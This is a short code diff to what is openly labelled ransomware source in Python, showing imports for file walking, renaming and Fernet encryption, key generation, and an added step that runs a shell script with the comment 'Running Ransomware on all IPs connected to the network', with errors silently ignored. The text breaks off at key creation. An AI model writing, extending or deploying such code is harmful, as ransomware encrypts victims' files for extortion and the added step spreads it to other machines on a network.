@@ -1,13 +1,20 @@
+import subprocess
+
 import mysql.connector
 from socket import gethostname
 from os import walk
 from os import path
 from os import rename
+from subprocess import call
 from getpass import getuser
 from cryptography.fernet import Fernet
 from Extensions import get_extensions
 from win32ui import *
 from win32con import *
+
+# Running Ransomware on all IPs connected to the network
+try:call(["bash", "./Runner.sh"])
+except: pass
 
 # Creating encryption key
 key = Fernet.generate_key()
